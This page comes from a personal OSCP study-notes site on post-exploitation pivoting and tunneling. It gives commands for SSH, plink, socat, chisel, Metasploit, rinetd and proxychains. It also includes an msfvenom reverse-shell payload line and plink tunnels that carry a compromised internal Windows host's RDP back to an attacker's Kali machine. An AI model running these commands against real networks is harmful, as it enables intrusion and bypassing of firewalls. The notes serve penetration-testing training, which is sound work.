<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>pivoting+tunneling | OSCP Notes</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="pivoting+tunneling" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="PORT FORWARDING “port to port”:" />
<meta property="og:description" content="PORT FORWARDING “port to port”:" />
<link rel="canonical" href="http://localhost:4000/6-post-exploitation/4.4-pivoting+tunneling/" />
<meta property="og:url" content="http://localhost:4000/6-post-exploitation/4.4-pivoting+tunneling/" />
<meta property="og:site_name" content="OSCP Notes" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
<script type="application/ld+json">
{"@type":"Article","url":"http://localhost:4000/6-post-exploitation/4.4-pivoting+tunneling/","headline":"pivoting+tunneling","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"PORT FORWARDING “port to port”:","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/css/main.css">
		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
				OSCP Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/">Hack The Planet</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/0-basics/1-network-basics/">basics</a>
							<ul>
								
									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
								
									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
							<ul>
								
									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
								
									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
								
									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/2-web/0-initial-enumeration/">web</a>
							<ul>
								
									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
								
									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
								
									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
								
									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
								
									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
								
									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
								
									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
								
									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
								
									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
								
									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
								
									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
								
									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/3-Exploiting/1-webshells/">exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/4-win-privesc/1-initial/">win privesc</a>
							<ul>
								
									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
							<ul>
								
									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
								
									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
								
									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
								
									<li class="nav-item current"><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/7-varios/tips/">varios</a>
							<ul>
								
									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
							<ul>
								
									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/changelog/"></a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>post exploitation</h2>
				<h3>pivoting+tunneling</h3>
			</div>
			<article class="content">
				<h1 id="port-forwarding-port-to-port">PORT FORWARDING “port to port”:</h1>

<h2 id="msf">MSF</h2>
<p>Most platforms</p>

<p>Forward:
Get meterpreter session on one of the dual homed machines
portfwd add -l 4445 -p 4443 -r 10.1.1.1
Use -R to make it reverse</p>

<h2 id="ssh">SSH</h2>
<h4 id="-in-kali">| in kali</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-R 8081:172.24.0.2:80 (on my Kali machine listen on 8081, get it from 172.24.0.2:80)
</code></pre></div></div>
<blockquote>
  <p>&lt;KALI 10.1.1.1&gt;:8081&lt;————&lt;REMOTE 172.24.0.2&gt;:80</p>
</blockquote>

<p>Now you can access 172.24.0.2:80, which you didn’t have direct access to</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-L 8083:127.0.0.1:8084 (on your machine listen on 8083, send it to my Kali machine on 8084)
</code></pre></div></div>

<blockquote>
  <p>&lt;KALI 127.0.0.1&gt;:8084&lt;————&lt;REMOTE 10.1.1.230&gt;:8083&lt;————<REMOTE X.X.X.X="">:XXXX</REMOTE></p>
</blockquote>

<p>run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it</p>

<h4 id="-for-reverse-shell">| For reverse shell:</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.1.1.230 LPORT=8083 -f exe -o shell
</code></pre></div></div>
<p>Run it on 2nd remote target to get a shell on Kali</p>

<p>Or if you didn’t have an SSH session, then SSH to your Kali from target machine:
On Kali: service ssh start “add a user, give it /bin/false in /etc/passwd”</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh - -R 12345:192.168.122.228:5986 test@10.1.1.1
</code></pre></div></div>

<h2 id="plink">PLINK</h2>
<p>Just like SSH, on Windows
service ssh start , and transfer /usr/share/windows-binaries/plink.exe to the target machine</p>

<p>On Target:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> plink.exe 10.1.1.1 -P 22 -C -N -L 0.0.0.0:4445:10.1.1.1:4443 -l KALIUSER -pw PASS
</code></pre></div></div>

<h2 id="socat">SOCAT</h2>
<p>For linux</p>

<p>Forward your 8083 to 62.41.90.2:443</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./socat TCP4-LISTEN:8083,fork TCP4:62.41.90.2:443
</code></pre></div></div>

<h2 id="chisel">CHISEL</h2>
<p>Most platforms</p>

<p>Remote static tunnels “port to port”:</p>

<p>On Kali “reverse proxy listener”:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel server -p 8000 -reverse
</code></pre></div></div>
<p>General command:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client &lt;YOUR IP&gt;:&lt;YOUR CHISEL SERVER PORT&gt; L/R:[YOUR LOCAL IP]:&lt;TUNNEL LISTENING PORT&gt;:&lt;TUNNEL TARGET&gt;:&lt;TUNNEL PORT&gt;
</code></pre></div></div>

<p>Remote tunnels “access IP:PORT you couldn’t access before”:
On Target:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client 10.1.1.1:8000 R:127.0.0.1:8001:172.19.0.3:80
</code></pre></div></div>

<p>Local tunnels “listen on the target for something, and send it to us”:
On Target:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client 10.1.1.1:8000 9001:127.0.0.1:8003
</code></pre></div></div>

<p> 
 </p>
<h1 id="dynamic-port-to-any">DYNAMIC “port to any”:</h1>
<hr />
<p>setup proxychains with socks5 on 127.0.0.1:1080
Or set up socks5 proxy on firefox
For nmap use -Pn -sT or use tcp scanner in msf</p>

<h2 id="msf-1">MSF</h2>
<p>Most platforms</p>

<p>Get meterpreter session on one of the dual homed machines
Auto route to 10.1.1.0 (multi/manage/autoroute)
Start socks proxy (auxiliary/server/socks4a)</p>

<h2 id="ssh-1">SSH</h2>
<p>For Linux</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-D1080
</code></pre></div></div>

<h2 id="plink-1">PLINK</h2>
<p>Just like SSH, on Windows
On Target:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> plink.exe 10.1.1.1 -P 22 -C -N -D 1080 -l KALIUSER -pw PASS
</code></pre></div></div>

<h2 id="chisel-1">CHISEL</h2>
<p>Most platforms</p>

<p>On Kali:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel server -p 8000 -reverse
</code></pre></div></div>
<p>On Target:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client 10.1.1.1:8000 R:8001:127.0.0.1:1080
./chisel server -p 8001 --socks5
</code></pre></div></div>

<p>On Kali:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client 127.0.0.1:8001 socks
</code></pre></div></div>

<p> 
 </p>
<h1 id="example">EXAMPLE</h1>
<hr />
<p>c:&gt; mstsc (el rdesktop de windows)</p>

<p>supongamos que tenemos un target (lopez) que queremos conectar a un server (w2003 67.23.72.109) por mstsc, el firewall de lopez deja salir paketes solo por el puerto 80, para poder usar el puerto 3389  vamos a necesitar otra maquina que nos haga de proxy(kali  208.88.127.99)</p>

<h2 id="pasos">Pasos</h2>

<p><strong>1</strong> En Kali usamos rinetd</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  root@kali: vim /etc/rinetd.conf
  #bindaddress     bindport  connectaddress    connectport
  208.88.127.99   80          67.23.72.109   3389
  root@kali: /etc/init.d/rinetd restart
</code></pre></div></div>

<p><strong>2</strong>  desde lopez nos conectamos a nuestro proxy machine en mstsc</p>

<p><strong>3</strong>  profit</p>

<p> 
 </p>

<h1 id="rdesktop-case">rdesktop case</h1>

<p>tengo shell en una windows box interna no routeable y le hice descargar plink</p>

<ul>
  <li>Nos conectamos con putty(plink) a nuestra kali(.99) y redirigimos el puerto 3389 en windows al 3390 en kali
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:&gt; Plink -l root -pw uberpass  208.88.127.99 -R 3390:127.0.0.1:3389   
</code></pre></div>    </div>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:netsta -antl | grep LISTENING &lt;-nos deberia mostrar el 3390 escuchando
</code></pre></div>    </div>
  </li>
</ul>

<p>#abrimios otra terminal y dejamos esa abierta que esta tuneleando</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  root@kali: rdesktop 127.0.0.1:3390  &lt;- nos deberia mostrar el remote desktop de windows

</code></pre></div></div>

<h1 id="proxychains">PROXYCHAINS</h1>
<hr />

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  root@kali:ssh -D 8080 root@admin.megacorpone.com
  root@admin: ifconfig (172.16.40.10)
</code></pre></div></div>

<p>#primero configuramos proxychains para que use el socks 8080</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  root@kali: proxychains &lt;tool&gt;
  ex:
  root@kali: proxychains nmap -p 3389 -sT -Pn 172.16.40.18-29 --open
  |s-CHAINS| ..... BLABLA
  ...
  (172.168.40.20)
  3389 open
  root@kali: proxychains rdesktop 172.168.40.20

</code></pre></div></div>

<p>https://hkashfi.blogspot.com.ar/2008/04/bypassing-firewalls-with-port_23.html</p>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
